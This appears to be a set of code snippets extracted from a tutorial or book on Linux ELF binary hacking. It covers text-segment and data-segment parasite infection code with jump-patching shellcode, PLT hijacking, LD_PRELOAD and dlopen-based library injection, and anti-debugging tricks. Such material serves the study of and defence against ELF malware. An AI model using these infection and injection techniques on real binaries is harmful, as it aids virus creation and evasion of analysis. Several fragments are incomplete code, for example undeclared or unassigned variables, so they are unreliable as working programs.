["```\n#define __NR_MMAP 9\nvoid *_mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)\n{\n        long mmap_fd = fd;\n        unsigned long mmap_off = off;\n        unsigned long mmap_flags = flags;\n        unsigned long ret;\n\n        __asm__ volatile(\n                         \"mov %0, %%rdi\\n\"\n                         \"mov %1, %%rsi\\n\"\n                         \"mov %2, %%rdx\\n\"\n                         \"mov %3, %%r10\\n\"\n                         \"mov %4, %%r8\\n\"\n                         \"mov %5, %%r9\\n\"\n                         \"mov $__NR_MMAP, %%rax\\n\"\n                         \"syscall\\n\" : : \"g\"(addr), \"g\"(len), \"g\"(prot),                \"g\"(flags), \"g\"(mmap_fd), \"g\"(mmap_off));\n        __asm__ volatile (\"mov %%rax, %0\" : \"=r\"(ret));\n        return (void *)ret;\n}\n```", "```\nvoid * _malloc(size_t len)\n{\n        void *mem = _mmap(NULL, len, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n        if (mem == (void *)-1)\n                return NULL;\n        return mem;\n}\n```", "```\nconst char *name = \"elfmaster\";\n```", "```\nchar name[10] = {'e', 'l', 'f', 'm', 'a', 's', 't', 'e', 'r', '\\0'};\n```", "```\nchar *name = \"elfmaster\";\n```", "```\n        ehdr->e_entry = phdr[TEXT].p_vaddr + phdr[TEXT].p_filesz\n        ```", "```\n#define JMP_PATCH_OFFSET 1 // how many bytes into the shellcode do we patch\n/* movl $addr, %eax; jmp *eax; */\nchar parasite_shellcode[] =\n        \"\\xb8\\x00\\x00\\x00\\x00\"      \n        \"\\xff\\xe0\"                  \n;\n\nint silvio_text_infect(char *host, void *base, void *payload, size_t host_len, size_t parasite_len)\n{\n        Elf64_Addr o_entry;\n        Elf64_Addr o_text_filesz;\n        Elf64_Addr parasite_vaddr;\n        uint64_t end_of_text;\n        int found_text;\n\n        uint8_t *mem = (uint8_t *)base;\n        uint8_t *parasite = (uint8_t *)payload;\n\n        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;\n        Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];\n        Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];\n\n        /*\n         * Adjust program headers\n         */\n        for (found_text = 0, i = 0; i < ehdr->e_phnum; i++) {\n                if (phdr[i].p_type == PT_LOAD) {\n                        if (phdr[i].p_offset == 0) {\n\n                                o_text_filesz = phdr[i].p_filesz;\n                                end_of_text = phdr[i].p_offset + phdr[i].p_filesz;\n                                parasite_vaddr = phdr[i].p_vaddr + o_text_filesz;\n\n                                phdr[i].p_filesz += parasite_len;\n                                phdr[i].p_memsz += parasite_len;\n\n                                for (j = i + 1; j < ehdr->e_phnum; j++)\n                                        if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz)\n                                                phdr[j].p_offset += PAGE_SIZE;\n\n                                }\n                                break;\n                        }\n        }\n        for (i = 0; i < ehdr->e_shnum; i++) {\n                if (shdr[i].sh_addr > parasite_vaddr)\n                        shdr[i].sh_offset += PAGE_SIZE;\n                else\n                if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr)\n                        shdr[i].sh_size += parasite_len;\n        }\n\n    /*\n      * NOTE: Read insert_parasite() src code next\n         */\n        insert_parasite(host, parasite_len, host_len,\n                        base, end_of_text, parasite, JMP_PATCH_OFFSET);\n        return 0;\n}\n```", "```\n#define TMP \"/tmp/.infected\"\n\nvoid insert_parasite(char *hosts_name, size_t psize, size_t hsize, uint8_t *mem, size_t end_of_text, uint8_t *parasite, uint32_t jmp_code_offset)\n{\n/* note: jmp_code_offset contains the\n* offset into the payload shellcode that\n* has the branch instruction to patch\n* with the original offset so control\n* flow can be transferred back to the\n* host.\n*/\n        int ofd;\n        unsigned int c;\n        int i, t = 0;\n        open (TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR|S_IXUSR|S_IWUSR);  \n        write (ofd, mem, end_of_text);\n        *(uint32_t *) &parasite[jmp_code_offset] = old_e_entry;\n        write (ofd, parasite, psize);\n        lseek (ofd, PAGE_SIZE - psize, SEEK_CUR);\n        mem += end_of_text;\n        unsigned int sum = end_of_text + PAGE_SIZE;\n        unsigned int last_chunk = hsize - end_of_text;\n        write (ofd, mem, last_chunk);\n        rename (TMP, hosts_name);\n        close (ofd);\n}\n```", "```\nuint8_t *mem = mmap_host_executable(\"./some_prog\");\nsilvio_text_infect(\"./some_prog\", mem, parasite_shellcode, parasite_len);\n```", "```\nmax_parasite_length = orig_text_vaddr - (0x1000 + sizeof(ElfN_Ehdr))\n```", "```\n(0x8048000 - (0x1000 + sizeof(ElfN_Ehdr)) = (parasite len)134508492\n```", "```\n    orig_text_vaddr \u2013 PAGE_ROUND(parasite_len) + sizeof(ElfN_Ehdr)\n    ```", "```\n        phdr->p_vaddr + phdr->p_filesz\n        ```", "```\n    phdr[DATA].p_flags |= PF_X;\n    ```", "```\n            ds_end_addr = phdr->p_vaddr + p_memsz\n        ```", "```\n            ds_end_off = phdr->p_offset + p_filesz\n        ```", "```\n            align_size = phdr->p_align\n        ```", "```\n            phdr->p_type = PT_LOAD;\n        ```", "```\n            ds_end_addr + align_size\n        ```", "```\n            phdr->p_filesz += parasite_size\n            phdr->p_memsz += parasite_size\n        ```", "```\n0000000000402350 <fopen@plt>:\n  402350:       ff 25 9a 7d 21 00       jmpq   *0x217d9a(%rip)        # 61a0f0\n  402356:       68 1b 00 00 00          pushq  $0x1b\n  40235b:       e9 30 fe ff ff          jmpq   402190 <_init+0x28>\n```", "```\npush $0x000000 ; push the address of parasite code onto stack\nret       ; return to parasite code\n```", "```\nmovl $<addr>, %eax  --- encoded as \\xb8\\x00\\x00\\x00\\x00\\xff\\xe0\njmp *%eax\npush $<addr>      --- encoded as \\x68\\x00\\x00\\x00\\xc3\nret\n```", "```\n$ export LD_PRELOAD=/tmp/wicked.so.1\n\n$ /usr/local/some_daemon\n\n$ cp /lib/x86_64-linux-gnu/libm-2.19.so /tmp/wicked.so.1\n\n$ export LD_PRELOAD=/tmp/wicked.so.1\n\n$ /usr/local/some_daemon &\n\n$ pmap `pidof some_daemon` | grep 'wicked'\n\n00007ffaa731e000   1044K r-x-- wicked.so.1\n\n00007ffaa7423000   2044K ----- wicked.so.1\n\n00007ffaa7622000      4K r---- wicked.so.1\n\n00007ffaa7623000      4K rw--- wicked.so.1\n```", "```\n#define DLOPEN_MODE_FLAG 0x80000000\n```", "```\n/* Taken from Saruman's launcher.c */\n#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag\n#define __BREAKPOINT__ __asm__ __volatile__(\"int3\");\n#define __RETURN_VALUE__(x) __asm__ __volatile__(\"mov %0, %%rax\\n\" :: \"g\"(x))\n\n__PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *path, void *dlopen_addr)\n{\n        void * (*libc_dlopen_mode)(const char *, int) = dlopen_addr;\n        void *handle;        handle = libc_dlopen_mode(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);\n        __RETURN_VALUE__(handle);\n        __BREAKPOINT__;\n}\n```", "```\nvoid anti_debug_check(void)\n{\n  if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {\n    printf(\"A debugger is attached, but not for long!\\n\");\n    kill(getpid());\n    exit(0);\n  }\n}\n```", "```\nstatic int caught = 0;\nint sighandle(int sig)\n{\n     caught++;\n}\nint detect_debugger(void)\n{\n    __asm__ volatile(\"int3\");\n    if (!caught) {\n        printf(\"There is a debugger attached!\\n\");\n        return 1;\n    }\n}\n```", "```\nryan@elfmaster:~$ head /proc/self/status\nName:  head\nState:  R (running)\nTgid:  19813\nNgid:  0\nPid:  19813\nPPid:  17364\nTracerPid:  0\nUid:  1000  1000  1000  1000\nGid:  31337  31337  31337  31337\nFDSize:  256\n\n```", "```\njmp antidebug + 1\nantidebug:\n.short 0xe9 ;first byte of a jmp instruction\nmov $0x31337, %eax\n```", "```\n   4:   eb 01                   jmp    7 <antidebug+0x1>\n   <antidebug:>\n   6:   e9 00 b8 37 13          jmpq   1337b80b\n   b:   03 00                 add    (%rax),%eax\n```"]